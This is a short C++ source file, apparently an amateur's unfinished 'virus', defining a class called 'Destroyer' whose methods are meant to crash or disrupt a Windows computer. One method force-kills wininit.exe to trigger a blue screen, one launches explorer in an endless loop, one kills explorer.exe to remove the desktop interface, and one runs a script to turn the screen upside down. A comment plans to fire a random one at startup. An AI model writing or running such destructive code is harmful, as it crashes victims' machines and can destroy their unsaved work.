#include <iostream>

/**Making an object "Destroyer", which will contain all the necessary functions. I think we should make 
 * it so that a random malicious function is called upon startup 
**/ 
class Destroyer{

    Destroyer()
    {
        std :: cout << "Virus Initialized...\n"; // Tried to make a constructor, so class can be used  
    }

    void bsod()//BSODs the computer
    {
       system("taskkill /IM \"wininit.exe\" /F");
       std :: cout << "This is a placeholder\n";
    }

    void overflow()//Opens explorer infinite times crashing the system 
    {
        while (true)
        {
            system("explorer");
        }
    }

    void killUI() //ends explorer task, hence destroying the ui of windows 10
    {
        system("taskkill /IM \"explorer.exe\" /F");
    }

    void rotate()//runs py script that turns screen upside down 
    {
      system("python rotate.py");
    }

};